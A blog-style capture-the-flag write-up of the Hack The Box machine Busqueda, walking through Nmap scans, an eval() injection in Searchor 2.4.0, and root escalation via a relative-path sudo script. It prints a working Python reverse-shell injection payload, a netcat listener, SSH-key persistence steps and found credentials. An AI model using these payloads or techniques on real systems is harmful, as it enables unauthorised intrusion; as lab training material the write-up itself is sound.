---
author: Chance Johnson
date: 2023-04-12
description: A relatively easy CTF by kavigihan on Hack The Box.
layout: post
title: Busqueda
---
[Busqueda](https://app.hackthebox.com/machines/Busqueda) by [kavigihan](https://app.hackthebox.com/users/389926) on Hack The Box.

# Enumeration
I started with a usual Nmap scan to see what ports are open:
```
sudo nmap -p- --min-rate 5000 10.10.11.208 
```

Output:
```
22/tcp open  ssh
80/tcp open  http
```

Looks like there's an SSH and HTTP server running. Now to check the service versions:
```
sudo nmap -p22,80 -sV 10.10.11.208
```

Output:
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There's an Apache server which I'm assuming is hosting serving web pages. I visited `http://10.10.11.208` in Firefox, however it seemed to be redirecting me to the domain `searcher.htb`. I added the following entry to `/etc/hosts`:
```
10.10.11.208     searcher.htb
```

I reloaded the page in Firefox:
![[Screenshot from 2023-04-13 21-30-01.png]]

It seems to be a web page for the [Searchor](https://github.com/ArjunSharda/Searchor) tool. At the bottom there is a field to enter a search query. I started off with a simple query:
![[Screenshot from 2023-04-13 21-34-34.png]]

After pressing "Search", I was redirected to `http://searcher.htb/search`, which contained the following contents:
![[Screenshot from 2023-04-13 21-37-48 1.png]]

At this point, I wanted to find some more information about Searchor. The website's footer indicates it's running Searchor version 2.4.0. I navigated to the [Searchor 2.4.0 GitHub](https://github.com/ArjunSharda/Searchor/tree/v2.4.0) page and began investigating. 

In the [main.py](https://github.com/ArjunSharda/Searchor/blob/v2.4.0/src/searchor/main.py#L32-L34) file, I noticed something very interesting:
```python
url = eval(
	f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
)
```

Searchor uses Python's `eval()` function to construct the URL. The `eval()` function in Python allows you to execute Python code from a given string. The web page on this box takes our input and uses it to craft the URL query. If you're nervously sweating right now, that's a good sign! 

Read more about `eval()` [here](Read more about it [here](https://www.codiga.io/blog/python-eval/).

# Foothold
Now it's time to figure out how to exploit this unsafe coding practice to run some arbitrary code. Yay for RCE! I need to figure out a way to escale the `{query}` parameter in the following line:
```python
f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
```

It's surrounded by single quotes, so I started off by simply entering `' f` as my search query. This showed me a blank page, so my guess is that this lead to some kind of error or something like that. This is progress.

Now it's time to get a reverse shell. I started a Netcat listener with `nc -lp 4444` and grabbed a Python reverse shell from [here](revshells.com) and altered it slightly:
```python
',exec('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.1.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'))#
```

I entered this as my search query at the bottom of the `http://searcher.htb` page, and pressed "Search". Now I have a reverse shell.

Before enumerating further, I wanted to establish an SSH connection if possible. I am currently logged in as the user `svc`, so I first created a directory `/home/svc/.ssh` and a new file called `authorized_keys` and added my public SSH key to this file. I then used this key to login: `ssh svc@searcher.htb -i id_rsa`.

# User
The user flag was in `/home/svc/user.txt`.

# Root
Time for some more enumeration. I navigated to `/var/www/app` which seemed to be the root directory for the website. In this directory I found a `.git` directory. In the `.git` directory was a file named `config` which contained the credentials `cody:jh1usoih2bkjaspwe92`. 

I tried the classic `sudo -l` and was prompted for a password. I used the password that I just found, and it worked.

The output told me I was able to run the command `/usr/bin/python3 /opt/scripts/system-checkup.py *` as sudo. 

I executed the following command:
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
```

The following was printed to the terminal:
```
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

In the original command, I replaced the `*` with `docker-ps`, `docker-inspect` and `full-checkup` and executed each in turn. The first two seemed to execute the commands `docker ps` and `docker inspect` respectively. The last one, `full-checkup`, seemed a bit strange. When I executed the command in the directory `/var/www/app`, it just printed `Something went wrong`. I navigated to `/opt/scripts/` to investigate.

In this directory, I found a file named `full-checkup.sh`. Is this the script that is executed when I use the `full-checkup` option in the original command? While in this directory, I executed the following command:
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

And it worked! I got a lot of output about the Docker containers and some other processes. It looks like this script is being executed relative to the directory in which you execute the command. All that's left to do now is create my own `full-checkup.sh` script.

I navigated back to `/home/svc/` and created a new file named `full-checkup.sh` with the following contents:
```
#!/bin/bash
cat /root/root.txt
```

I set the execute bit with `chmod +x full-checkup.sh` and again executed `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`, and this time it printed out the root flag!